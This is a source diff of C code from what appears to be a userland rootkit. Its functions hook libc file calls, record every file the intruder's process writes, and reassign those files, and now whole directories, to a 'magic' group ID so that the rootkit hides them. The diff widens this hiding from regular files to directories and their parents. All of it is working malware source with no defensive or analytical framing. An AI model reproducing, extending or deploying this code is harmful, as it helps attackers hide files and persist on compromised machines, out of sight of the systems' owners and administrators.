@@ -1,5 +1,8 @@
 int pathtracked(const char *pathname){
-    for(int i = 0; i != sizeofarr(notrack); i++)
+    if(!strcmp(".\0", pathname) || !strcmp("..\0", pathname) || pathname[0] != '/')
+        return 1;
+
+    for(int i = 0; i != NOTRACK_SIZE; i++)
         if(!strncmp(notrack[i], pathname, strlen(notrack[i])))
             return 1;
 
@@ -10,8 +13,10 @@ int pathtracked(const char *pathname){
     if((long)call(C__XSTAT, _STAT_VER, pathname, &assstat) < 0)
         return 1;
 
-    // only track reg files that belong to us...
-    if(!S_ISREG(assstat.st_mode) || assstat.st_gid != readgid())
+    if(!S_ISREG(assstat.st_mode) && !S_ISDIR(assstat.st_mode))
+        return 1;
+
+    if(assstat.st_gid != readgid())
         return 1;
 
     if(strstr(pathname, "swp")){ // ignore very temporary swp files
@@ -51,18 +56,19 @@ int pathtracked(const char *pathname){
 void trackwrite(const char *pathname){
     FILE *fp;
     char buf[strlen(pathname)+2];
-    hook(CFOPEN, CFWRITE);
+    hook(CFOPEN, CFWRITE, CCHMOD);
     if(pathtracked(pathname)) return;
     fp = call(CFOPEN, ASS_PATH, "a+");
     if(fp == NULL) return;
     snprintf(buf, sizeof(buf), "%s\n", pathname);
     call(CFWRITE, buf, 1, strlen(buf), fp);
     fclose(fp);
+    chown_path(ASS_PATH, readgid());
 }
 
 void hidemyass(void){
     FILE *fp;
-    struct stat assstat;
+    struct stat assstat, assdirstat;
     gid_t magicgid;
 
     hook(CFOPEN, C__XSTAT);
@@ -80,9 +86,23 @@ void hidemyass(void){
             if((long)call(C__XSTAT, _STAT_VER, line, &assstat) < 0)
                 continue;
 
-            // if the path has been unhidden after creation this makes sure it is ignored.
-            if(assstat.st_gid != 0)
+            if(assstat.st_gid == 0)
+                continue; // assume path has been manually unhidden...
+
+            if(S_ISDIR(assstat.st_mode))
+                hidedircontents(line, magicgid);
+            else if(S_ISREG(assstat.st_mode))
                 chown_path(line, magicgid);
+
+            char *assdirname = dirname(line);
+            if(assdirname == NULL) continue;
+
+            memset(&assdirstat, 0, sizeof(struct stat));
+            if((long)call(C__XSTAT, _STAT_VER, assdirname, &assdirstat) < 0)
+                continue;
+
+            if(assdirstat.st_gid == magicgid)
+                hidedircontents(assdirname, magicgid);
         }
 
         fclose(fp);
